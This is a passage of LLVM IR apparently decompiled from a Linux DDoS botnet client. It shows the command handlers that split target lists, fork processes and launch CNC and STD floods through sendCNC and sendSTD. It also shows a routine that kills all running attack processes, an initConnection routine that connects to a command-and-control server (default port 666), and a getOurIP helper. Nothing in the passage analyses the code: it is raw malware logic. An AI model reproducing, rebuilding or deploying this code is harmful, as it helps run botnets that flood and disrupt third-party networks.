  %tmp104 = icmp slt i32 %arg1, 4
  br i1 %tmp104, label %dec_label_pc_1000949c, label %dec_label_pc_1000945c

dec_label_pc_1000945c:                            ; preds = %dec_label_pc_10009450
  %v1_10009460 = add i32 %tmp, 8
  %v1_10009464 = inttoptr i32 %v1_10009460 to i32*
  %v2_10009464 = load i32, i32* %v1_10009464, align 4
  store i32 268473456, i32* @lr, align 4
  %v2_1000946c = call i32 @atol(i32 %v2_10009464, i32 %v1_10009460)
  %tmp105 = icmp slt i32 %v2_1000946c, 1
  br i1 %tmp105, label %dec_label_pc_1000949c, label %dec_label_pc_1000947c

dec_label_pc_1000947c:                            ; preds = %dec_label_pc_1000945c
  %v1_10009480 = add i32 %tmp, 12
  %v1_10009484 = inttoptr i32 %v1_10009480 to i32*
  %v2_10009484 = load i32, i32* %v1_10009484, align 4
  store i32 268473488, i32* @lr, align 4
  %v2_1000948c = call i32 @atol(i32 %v2_10009484, i32 %v1_10009480)
  %v2_10009494 = icmp sgt i32 %v2_1000948c, 0
  br i1 %v2_10009494, label %dec_label_pc_100094bc, label %dec_label_pc_1000949c

dec_label_pc_1000949c:                            ; preds = %dec_label_pc_1000947c, %dec_label_pc_1000945c, %dec_label_pc_10009450
  %v3_100094a0 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_100094b8.763 to i32), i32* @lr, align 4
  %v4_100094b4 = call i32 @sockprintf(i32 %v3_100094a0, i32 ptrtoint ([27 x i8]* @global_var_1001c13c.762 to i32), i32 268566528)
  br label %dec_label_pc_100098fc

dec_label_pc_100094bc:                            ; preds = %dec_label_pc_1000947c
  %v1_100094c0 = add i32 %tmp, 4
  %v1_100094c4 = inttoptr i32 %v1_100094c0 to i32*
  %v2_100094c4 = load i32, i32* %v1_100094c4, align 4
  %v2_100094d4 = load i32, i32* %v1_10009464, align 4
  store i32 268473568, i32* @lr, align 4
  %v2_100094dc = call i32 @atol(i32 %v2_100094d4, i32 %v1_10009460)
  %v2_100094f0 = load i32, i32* %v1_10009484, align 4
  store i32 268473596, i32* @lr, align 4
  %v2_100094f8 = call i32 @atol(i32 %v2_100094f0, i32 %v1_10009480)
  store i32 %v2_100094c4, i32* @r3, align 4
  store i32 268473620, i32* @lr, align 4
  %v2_10009510 = call i32 @__GI_strchr(i32 %v2_100094c4, i32 44)
  %v3_10009518 = icmp eq i32 %v2_10009510, 0
  br i1 %v3_10009518, label %dec_label_pc_100095a0, label %dec_label_pc_10009520

dec_label_pc_10009520:                            ; preds = %dec_label_pc_100094bc
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268473652, i32* @lr, align 4
  %v3_10009530 = call i32 @__GI_strtok(i32 %v2_100094c4, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_1000959430 = icmp eq i32 %v3_10009530, 0
  br i1 %v3_1000959430, label %dec_label_pc_100095c8, label %dec_label_pc_10009540

dec_label_pc_10009540:                            ; preds = %dec_label_pc_10009520, %dec_label_pc_10009578
  %storemerge1531 = phi i32 [ %v3_10009584, %dec_label_pc_10009578 ], [ %v3_10009530, %dec_label_pc_10009520 ]
  store i32 268473668, i32* @lr, align 4
  %v0_10009540 = call i32 @listFork()
  %v3_10009548 = icmp eq i32 %v0_10009540, 0
  br i1 %v3_10009548, label %dec_label_pc_10009550, label %dec_label_pc_10009578

dec_label_pc_10009550:                            ; preds = %dec_label_pc_10009540
  store i32 268473696, i32* @lr, align 4
  %v3_1000955c = call i32 @sendCNC(i32 %storemerge1531, i32 %v2_100094dc, i32 %v2_100094f8)
  %v3_10009564 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009570.764 to i32), i32* @lr, align 4
  %v1_1000956c = call i32 @__libc_close(i32 %v3_10009564)
  %v1_10009574 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009578

dec_label_pc_10009578:                            ; preds = %dec_label_pc_10009540, %dec_label_pc_10009550
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268473736, i32* @lr, align 4
  %v3_10009584 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_10009594 = icmp eq i32 %v3_10009584, 0
  br i1 %v3_10009594, label %dec_label_pc_100095c8, label %dec_label_pc_10009540

dec_label_pc_100095a0:                            ; preds = %dec_label_pc_100094bc
  store i32 268473764, i32* @lr, align 4
  %v0_100095a0 = call i32 @listFork()
  %v3_100095a8 = icmp eq i32 %v0_100095a0, 0
  br i1 %v3_100095a8, label %dec_label_pc_100095b0, label %dec_label_pc_100098fc

dec_label_pc_100095b0:                            ; preds = %dec_label_pc_100095a0
  store i32 ptrtoint ([3 x i8]* @global_var_100095c0.766 to i32), i32* @lr, align 4
  %v3_100095bc = call i32 @sendCNC(i32 %v2_100094c4, i32 %v2_100094dc, i32 %v2_100094f8)
  %v1_100095c4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100095c8

dec_label_pc_100095c8:                            ; preds = %dec_label_pc_10009578, %dec_label_pc_10009520, %dec_label_pc_1000942c, %dec_label_pc_100095b0
  %v2_100095cc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001c158.767 to i32), i32* @r4, align 4
  %v3_100095dc = inttoptr i32 %v2_100095cc to i8*
  %v4_100095dc = call i32 @__GI_strcoll(i8* %v3_100095dc, i32 ptrtoint ([4 x i8]* @global_var_1001c158.767 to i32))
  %v3_100095e4 = icmp eq i32 %v4_100095dc, 0
  br i1 %v3_100095e4, label %dec_label_pc_100095ec, label %dec_label_pc_10009754

dec_label_pc_100095ec:                            ; preds = %dec_label_pc_100095c8
  %tmp106 = icmp slt i32 %arg1, 4
  br i1 %tmp106, label %dec_label_pc_10009638, label %dec_label_pc_100095f8

dec_label_pc_100095f8:                            ; preds = %dec_label_pc_100095ec
  %v1_100095fc = add i32 %tmp, 8
  %v1_10009600 = inttoptr i32 %v1_100095fc to i32*
  %v2_10009600 = load i32, i32* %v1_10009600, align 4
  store i32 268473868, i32* @lr, align 4
  %v2_10009608 = call i32 @atol(i32 %v2_10009600, i32 %v1_100095fc)
  %tmp107 = icmp slt i32 %v2_10009608, 1
  br i1 %tmp107, label %dec_label_pc_10009638, label %dec_label_pc_10009618

dec_label_pc_10009618:                            ; preds = %dec_label_pc_100095f8
  %v1_1000961c = add i32 %tmp, 12
  %v1_10009620 = inttoptr i32 %v1_1000961c to i32*
  %v2_10009620 = load i32, i32* %v1_10009620, align 4
  store i32 268473900, i32* @lr, align 4
  %v2_10009628 = call i32 @atol(i32 %v2_10009620, i32 %v1_1000961c)
  %v2_10009630 = icmp sgt i32 %v2_10009628, 0
  br i1 %v2_10009630, label %dec_label_pc_10009658, label %dec_label_pc_10009638

dec_label_pc_10009638:                            ; preds = %dec_label_pc_10009618, %dec_label_pc_100095f8, %dec_label_pc_100095ec
  %v3_1000963c = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_10009654.769 to i32), i32* @lr, align 4
  %v4_10009650 = call i32 @sockprintf(i32 %v3_1000963c, i32 ptrtoint ([27 x i8]* @global_var_1001c15c.768 to i32), i32 268566528)
  br label %dec_label_pc_100098fc

dec_label_pc_10009658:                            ; preds = %dec_label_pc_10009618
  %v1_1000965c = add i32 %tmp, 4
  %v1_10009660 = inttoptr i32 %v1_1000965c to i32*
  %v2_10009660 = load i32, i32* %v1_10009660, align 4
  %v2_10009670 = load i32, i32* %v1_10009600, align 4
  store i32 268473980, i32* @lr, align 4
  %v2_10009678 = call i32 @atol(i32 %v2_10009670, i32 %v1_100095fc)
  %v2_1000968c = load i32, i32* %v1_10009620, align 4
  store i32 268474008, i32* @lr, align 4
  %v2_10009694 = call i32 @atol(i32 %v2_1000968c, i32 %v1_1000961c)
  store i32 %v2_10009660, i32* @r3, align 4
  store i32 268474032, i32* @lr, align 4
  %v2_100096ac = call i32 @__GI_strchr(i32 %v2_10009660, i32 44)
  %v3_100096b4 = icmp eq i32 %v2_100096ac, 0
  br i1 %v3_100096b4, label %dec_label_pc_1000972c, label %dec_label_pc_100096bc

dec_label_pc_100096bc:                            ; preds = %dec_label_pc_10009658
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268474064, i32* @lr, align 4
  %v3_100096cc = call i32 @__GI_strtok(i32 %v2_10009660, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_1000972026 = icmp eq i32 %v3_100096cc, 0
  br i1 %v3_1000972026, label %dec_label_pc_10009754, label %dec_label_pc_100096dc

dec_label_pc_100096dc:                            ; preds = %dec_label_pc_100096bc, %dec_label_pc_10009704
  %storemerge1327 = phi i32 [ %v3_10009710, %dec_label_pc_10009704 ], [ %v3_100096cc, %dec_label_pc_100096bc ]
  store i32 268474080, i32* @lr, align 4
  %v0_100096dc = call i32 @listFork()
  %v3_100096e4 = icmp eq i32 %v0_100096dc, 0
  br i1 %v3_100096e4, label %dec_label_pc_100096ec, label %dec_label_pc_10009704

dec_label_pc_100096ec:                            ; preds = %dec_label_pc_100096dc
  %v3_100096f8 = call i32 @sendSTD(i32 %storemerge1327, i32 %v2_10009678, i32 %v2_10009694)
  %v1_10009700 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009704

dec_label_pc_10009704:                            ; preds = %dec_label_pc_100096dc, %dec_label_pc_100096ec
  store i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32* @r4, align 4
  store i32 268474132, i32* @lr, align 4
  %v3_10009710 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10014630.286 to i32), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v3_10009720 = icmp eq i32 %v3_10009710, 0
  br i1 %v3_10009720, label %dec_label_pc_10009754, label %dec_label_pc_100096dc

dec_label_pc_1000972c:                            ; preds = %dec_label_pc_10009658
  store i32 268474160, i32* @lr, align 4
  %v0_1000972c = call i32 @listFork()
  %v3_10009734 = icmp eq i32 %v0_1000972c, 0
  br i1 %v3_10009734, label %dec_label_pc_1000973c, label %dec_label_pc_100098fc

dec_label_pc_1000973c:                            ; preds = %dec_label_pc_1000972c
  %v3_10009748 = call i32 @sendSTD(i32 %v2_10009660, i32 %v2_10009678, i32 %v2_10009694)
  %v1_10009750 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10009754

dec_label_pc_10009754:                            ; preds = %dec_label_pc_10009704, %dec_label_pc_100096bc, %dec_label_pc_100095c8, %dec_label_pc_1000973c
  %v2_10009758 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1001c178.773 to i32), i32* @r4, align 4
  %v3_10009768 = inttoptr i32 %v2_10009758 to i8*
  %v4_10009768 = call i32 @__GI_strcoll(i8* %v3_10009768, i32 ptrtoint ([9 x i8]* @global_var_1001c178.773 to i32))
  %v3_10009770 = icmp eq i32 %v4_10009768, 0
  br i1 %v3_10009770, label %dec_label_pc_10009778, label %dec_label_pc_100098d0

dec_label_pc_10009778:                            ; preds = %dec_label_pc_10009754
  br label %dec_label_pc_1000981c

dec_label_pc_1000978c:                            ; preds = %dec_label_pc_1000981c, %dec_label_pc_10009864
  %v1_10009790 = mul i32 %storemerge11, 4
  %v3_1000979c = load i32, i32* @global_var_1002e61c.50, align 4
  %v2_100097a0 = add i32 %v3_1000979c, %v1_10009790
  %v1_100097a4 = inttoptr i32 %v2_100097a0 to i32*
  %v2_100097a4 = load i32, i32* %v1_100097a4, align 4
  %v3_100097a8 = icmp eq i32 %v2_100097a4, 0
  br i1 %v3_100097a8, label %dec_label_pc_10009810, label %dec_label_pc_100097b0

dec_label_pc_100097b0:                            ; preds = %dec_label_pc_1000978c
  %v2_100097c8 = load i32, i32* %v1_100097a4, align 4
  store i32 268474320, i32* @lr, align 4
  %v0_100097cc = call i32 @__libc_getpid()
  %v4_100097d4 = icmp eq i32 %v2_100097c8, %v0_100097cc
  br i1 %v4_100097d4, label %dec_label_pc_10009810, label %dec_label_pc_100097dc

dec_label_pc_100097dc:                            ; preds = %dec_label_pc_100097b0
  %v3_100097ec = load i32, i32* @global_var_1002e61c.50, align 4
  %v2_100097f0 = add i32 %v3_100097ec, %v1_10009790
  %v1_100097f4 = inttoptr i32 %v2_100097f0 to i32*
  %v2_100097f4 = load i32, i32* %v1_100097f4, align 4
  store i32 268474372, i32* @lr, align 4
  %v2_10009800 = call i32 @kill(i32 %v2_100097f4, i32 9)
  %v1_10009808 = add i32 %stack_var_-212.1, 1
  br label %dec_label_pc_10009810

dec_label_pc_10009810:                            ; preds = %dec_label_pc_100097b0, %dec_label_pc_1000978c, %dec_label_pc_100097dc
  %stack_var_-212.0 = phi i32 [ %stack_var_-212.1, %dec_label_pc_1000978c ], [ %stack_var_-212.1, %dec_label_pc_100097b0 ], [ %v1_10009808, %dec_label_pc_100097dc ]
  %v1_10009814 = add i32 %storemerge11, 1
  br label %dec_label_pc_1000981c

dec_label_pc_1000981c:                            ; preds = %dec_label_pc_10009778, %dec_label_pc_10009810
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_10009778 ], [ %stack_var_-212.0, %dec_label_pc_10009810 ]
  %storemerge11 = phi i32 [ 0, %dec_label_pc_10009778 ], [ %v1_10009814, %dec_label_pc_10009810 ]
  %v2_10009844 = load i32, i32* @global_var_1002e5f0.48, align 4
  %v3_1000985c = icmp eq i32 %v2_10009844, 0
  br i1 %v3_1000985c, label %dec_label_pc_10009864, label %dec_label_pc_1000978c

dec_label_pc_10009864:                            ; preds = %dec_label_pc_1000981c
  %v3_10009848 = load i32, i32* @global_var_1002e5f4.49, align 4
  %v3_1000987c = icmp ugt i32 %v3_10009848, %storemerge11
  br i1 %v3_1000987c, label %dec_label_pc_1000978c, label %dec_label_pc_10009884

dec_label_pc_10009884:                            ; preds = %dec_label_pc_10009864
  %tmp108 = icmp slt i32 %stack_var_-212.1, 1
  %v3_100098b8 = load i32, i32* @global_var_1002e5e8.31, align 4
  br i1 %tmp108, label %dec_label_pc_100098b4, label %dec_label_pc_10009890

dec_label_pc_10009890:                            ; preds = %dec_label_pc_10009884
  store i32 ptrtoint (i32* @global_var_100098b0.775 to i32), i32* @lr, align 4
  %v5_100098ac = call i32 @sockprintf(i32 %v3_100098b8, i32 ptrtoint ([11 x i8]* @global_var_1001c184.774 to i32), i32 %stack_var_-212.1)
  br label %dec_label_pc_100098d0

dec_label_pc_100098b4:                            ; preds = %dec_label_pc_10009884
  store i32 268474576, i32* @lr, align 4
  %v4_100098cc = call i32 @sockprintf(i32 %v3_100098b8, i32 ptrtoint ([13 x i8]* @global_var_1001c190.776 to i32), i32 268566528)
  br label %dec_label_pc_100098d0

dec_label_pc_100098d0:                            ; preds = %dec_label_pc_10009754, %dec_label_pc_10009890, %dec_label_pc_100098b4
  %v2_100098d4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1001c1a0.777 to i32), i32* @r4, align 4
  %v3_100098e4 = inttoptr i32 %v2_100098d4 to i8*
  %v4_100098e4 = call i32 @__GI_strcoll(i8* %v3_100098e4, i32 ptrtoint ([10 x i8]* @global_var_1001c1a0.777 to i32))
  %v3_100098ec = icmp eq i32 %v4_100098e4, 0
  br i1 %v3_100098ec, label %dec_label_pc_100098f4, label %dec_label_pc_100098fc

dec_label_pc_100098f4:                            ; preds = %dec_label_pc_100098d0
  %v0_100098f8 = call i32 @__GI_exit()
  br label %dec_label_pc_100098fc

dec_label_pc_100098fc:                            ; preds = %dec_label_pc_10008ed8, %dec_label_pc_10008e7c, %dec_label_pc_1000937c, %dec_label_pc_100095a0, %dec_label_pc_1000972c, %dec_label_pc_100098d0, %dec_label_pc_10008f00, %dec_label_pc_10008a44, %dec_label_pc_100088bc, %dec_label_pc_1000924c, %dec_label_pc_100089b0, %dec_label_pc_10008848, %dec_label_pc_10009638, %dec_label_pc_1000949c, %dec_label_pc_10009050, %dec_label_pc_10008d0c, %dec_label_pc_10008b74, %dec_label_pc_10008a6c, %dec_label_pc_100088f4, %dec_label_pc_100087d0, %dec_label_pc_10008780, %dec_label_pc_1000873c, %dec_label_pc_100098f4
  %v0_10009924 = phi i32 [ %v0_1000937c, %dec_label_pc_1000937c ], [ %v0_100095a0, %dec_label_pc_100095a0 ], [ %v0_1000972c, %dec_label_pc_1000972c ], [ %v4_100098e4, %dec_label_pc_100098d0 ], [ %v0_10008f00, %dec_label_pc_10008f00 ], [ 0, %dec_label_pc_10008a44 ], [ 0, %dec_label_pc_100088bc ], [ 0, %dec_label_pc_1000924c ], [ 0, %dec_label_pc_100089b0 ], [ 0, %dec_label_pc_10008848 ], [ %v4_10009650, %dec_label_pc_10009638 ], [ %v4_100094b4, %dec_label_pc_1000949c ], [ %v4_10009068, %dec_label_pc_10009050 ], [ %v4_10008d24, %dec_label_pc_10008d0c ], [ %v5_10008bac, %dec_label_pc_10008b74 ], [ %v0_10008a54, %dec_label_pc_10008a6c ], [ %v0_100088cc, %dec_label_pc_100088f4 ], [ %v1_100087f4, %dec_label_pc_100087d0 ], [ %v5_100087a4, %dec_label_pc_10008780 ], [ %v4_10008754, %dec_label_pc_1000873c ], [ %v0_100098f8, %dec_label_pc_100098f4 ], [ 0, %dec_label_pc_10008e7c ], [ 0, %dec_label_pc_10008ed8 ]
  ret i32 %v0_10009924

; uselistorder directives
  uselistorder i32 %v3_100098b8, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 0, 2 }
  uselistorder i32 %stack_var_-212.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_10009790, { 1, 0 }
  uselistorder i32 %v3_10009710, { 1, 0 }
  uselistorder i32 %v2_10009694, { 1, 0 }
  uselistorder i32 %v2_10009678, { 1, 0 }
  uselistorder i32 %v2_10009660, { 1, 0, 3, 2 }
  uselistorder i32 %v3_10009584, { 1, 0 }
  uselistorder i32 %v2_100094f8, { 1, 0 }
  uselistorder i32 %v2_100094dc, { 1, 0 }
  uselistorder i32 %v2_100094c4, { 1, 0, 3, 2 }
  uselistorder i32* %v1_10009260, { 2, 0, 1, 3 }
  uselistorder i32 %v3_100091d4, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_100090dc, { 1, 0 }
  uselistorder i32 %v2_100090c8, { 1, 0 }
  uselistorder i32 %v2_100090ac, { 1, 0 }
  uselistorder i32 %v2_10009090, { 1, 0 }
  uselistorder i32 %v2_10009078, { 1, 0, 3, 2 }
  uselistorder i32 %v3_10008ee4, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %storemerge1022, { 1, 0 }
  uselistorder i32 %v2_10008dc8, { 1, 0 }
  uselistorder i32 %v2_10008da0, { 1, 0 }
  uselistorder i32 %v2_10008d84, { 1, 0 }
  uselistorder i32 %v2_10008d68, { 1, 0 }
  uselistorder i32 %v2_10008d4c, { 1, 0 }
  uselistorder i32 %v2_10008d34, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 %tmp, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 5, 6, 7, 17, 4, 18, 19, 20, 21, 3, 22, 23, 24, 2, 1, 0, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10014630.286 to i32), { 3, 12, 4, 13, 2, 14, 5, 15, 1, 16, 6, 17, 0, 18, 7, 19, 8, 20, 9, 21, 10, 22, 11, 23 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1001bf58.732 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10013cbc.32 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1001be84.715 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1001be34.712 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @ClearHistory, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100098fc, { 22, 5, 4, 12, 3, 13, 2, 9, 14, 6, 0, 1, 15, 16, 17, 7, 10, 18, 8, 11, 19, 20, 21 }
  uselistorder label %dec_label_pc_100098d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000981c, { 1, 0 }
  uselistorder label %dec_label_pc_10009810, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000978c, { 1, 0 }
  uselistorder label %dec_label_pc_10009754, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009704, { 1, 0 }
  uselistorder label %dec_label_pc_100096dc, { 1, 0 }
  uselistorder label %dec_label_pc_100095c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009578, { 1, 0 }
  uselistorder label %dec_label_pc_10009540, { 1, 0 }
  uselistorder label %dec_label_pc_1000942c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009354, { 1, 0 }
  uselistorder label %dec_label_pc_100092a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009228, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100091c8, { 1, 0 }
  uselistorder label %dec_label_pc_10009190, { 1, 0 }
  uselistorder label %dec_label_pc_1000914c, { 1, 0 }
  uselistorder label %dec_label_pc_10009114, { 1, 0 }
  uselistorder label %dec_label_pc_10009070, { 1, 0 }
  uselistorder label %dec_label_pc_10008f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10008ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10008e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10008e58, { 1, 0 }
  uselistorder label %dec_label_pc_10008e20, { 1, 0 }
  uselistorder label %dec_label_pc_10008e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10008d2c, { 1, 0 }
  uselistorder label %dec_label_pc_10008b50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008ad4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008a1c, { 1, 0 }
  uselistorder label %dec_label_pc_10008964, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008894, { 1, 0 }
  uselistorder label %dec_label_pc_10008718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100086c4, { 1, 0 }
  uselistorder label %dec_label_pc_10008670, { 1, 0 }
  uselistorder label %dec_label_pc_1000861c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_1000993c = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268474708, i32* @lr, align 4
  %v3_10009950 = call i32 @__GI_memset(i32 %v2_1000993c, i32 0, i32 4096)
  %v3_10009958 = load i32, i32* @global_var_1002e5e8.31, align 4
  %v3_1000995c = icmp eq i32 %v3_10009958, 0
  br i1 %v3_1000995c, label %dec_label_pc_10009980, label %dec_label_pc_10009964

dec_label_pc_10009964:                            ; preds = %entry
  store i32 268474740, i32* @lr, align 4
  %v1_10009970 = call i32 @__libc_close(i32 %v3_10009958)
  store i32 0, i32* @global_var_1002e5e8.31, align 4
  br label %dec_label_pc_10009980

dec_label_pc_10009980:                            ; preds = %entry, %dec_label_pc_10009964
  %v3_10009984 = load i32, i32* @global_var_1002e5a4.778, align 4
  %v3_10009988 = icmp eq i32 %v3_10009984, 0
  br i1 %v3_10009988, label %dec_label_pc_10009990, label %dec_label_pc_100099a0

dec_label_pc_10009990:                            ; preds = %dec_label_pc_10009980
  br label %dec_label_pc_100099b4

dec_label_pc_100099a0:                            ; preds = %dec_label_pc_10009980
  %v1_100099a8 = add i32 %v3_10009984, 1
  br label %dec_label_pc_100099b4

dec_label_pc_100099b4:                            ; preds = %dec_label_pc_10009990, %dec_label_pc_100099a0
  %storemerge = phi i32 [ 0, %dec_label_pc_10009990 ], [ %v1_100099a8, %dec_label_pc_100099a0 ]
  store i32 %storemerge, i32* @global_var_1002e5a4.778, align 4
  %v1_100099c8 = mul i32 %storemerge, 4
  %v2_100099cc = add i32 %v1_100099c8, ptrtoint ([18 x i8]** @global_var_1002e5a0.780 to i32)
  %v1_100099d0 = inttoptr i32 %v2_100099cc to i32*
  %v2_100099d0 = load i32, i32* %v1_100099d0, align 4
  %v2_100099dc = inttoptr i32 %v2_100099d0 to i8*
  %v3_100099dc = call i32 @strcpy(i32 %v2_1000993c, i8* %v2_100099dc)
  store i32 %v2_1000993c, i32* @r3, align 4
  store i32 268474872, i32* @lr, align 4
  %v2_100099f4 = call i32 @__GI_strchr(i32 %v2_1000993c, i32 58)
  %v3_100099fc = icmp eq i32 %v2_100099f4, 0
  br i1 %v3_100099fc, label %dec_label_pc_10009a4c, label %dec_label_pc_10009a04

dec_label_pc_10009a04:                            ; preds = %dec_label_pc_100099b4
  store i32 %v2_1000993c, i32* @r3, align 4
  store i32 268474900, i32* @lr, align 4
  %v2_10009a10 = call i32 @__GI_strchr(i32 %v2_1000993c, i32 58)
  %v1_10009a18 = add i32 %v2_10009a10, 1
  store i32 268474916, i32* @lr, align 4
  %v2_10009a20 = call i32 @atol(i32 %v1_10009a18, i32 %v2_10009a10)
  store i32 %v2_1000993c, i32* @r3, align 4
  store i32 268474940, i32* @lr, align 4
  %v2_10009a38 = call i32 @__GI_strchr(i32 %v2_1000993c, i32 58)
  %v3_10009a48 = inttoptr i32 %v2_10009a38 to i8*
  store i8 0, i8* %v3_10009a48, align 1
  br label %dec_label_pc_10009a4c

dec_label_pc_10009a4c:                            ; preds = %dec_label_pc_100099b4, %dec_label_pc_10009a04
  %stack_var_-4136.0 = phi i32 [ 666, %dec_label_pc_100099b4 ], [ %v2_10009a20, %dec_label_pc_10009a04 ]
  store i32 268474972, i32* @lr, align 4
  %v3_10009a58 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10009a58, i32* @global_var_1002e5e8.31, align 4
  store i32 268475016, i32* @lr, align 4
  %v5_10009a84 = call i32 @connectTimeout(i32 %v3_10009a58, i32 %v2_1000993c, i32 %stack_var_-4136.0, i32 30, i32 %v2_1000993c)
  %v3_10009a8c = icmp eq i32 %v5_10009a84, 0
  %. = zext i1 %v3_10009a8c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1000993c, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10009a4c, { 1, 0 }
  uselistorder label %dec_label_pc_100099b4, { 1, 0 }
  uselistorder label %dec_label_pc_10009980, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268475116, i32* @lr, align 4
  %v3_10009ae8 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_10009afc = icmp eq i32 %v3_10009ae8, -1
  br i1 %v4_10009afc, label %dec_label_pc_10009b04, label %dec_label_pc_10009b10

dec_label_pc_10009b04:                            ; preds = %entry
  br label %dec_label_pc_10009d3c

dec_label_pc_10009b10:                            ; preds = %entry
  %v2_10009b10 = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268475208, i32* @lr, align 4
  %v2_10009b44 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1001c1ac.782 to i32))
  store i32 53, i32* @r3, align 4
  %v1_10009b54 = call i32 @htons(i32 53)
  store i32 268475252, i32* @lr, align 4
  %v3_10009b70 = call i32 @__libc_connect(i32 %v3_10009ae8, i32 %v2_10009b10, i32 16)
  %v4_10009b84 = icmp eq i32 %v3_10009b70, -1
  br i1 %v4_10009b84, label %dec_label_pc_10009b8c, label %dec_label_pc_10009b98

dec_label_pc_10009b8c:                            ; preds = %dec_label_pc_10009b10
  br label %dec_label_pc_10009d3c

dec_label_pc_10009b98:                            ; preds = %dec_label_pc_10009b10
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_10009ba0 = ptrtoint i32* %stack_var_-4180 to i32
  %v2_10009ba4 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268475320, i32* @lr, align 4
  %v4_10009bb4 = call i32 @__GI_getsockname(i32 %v3_10009ae8, i32 %v2_10009ba0, i32 %v2_10009ba4, i32 %v2_10009ba4)
  %v4_10009bc8 = icmp eq i32 %v4_10009bb4, -1
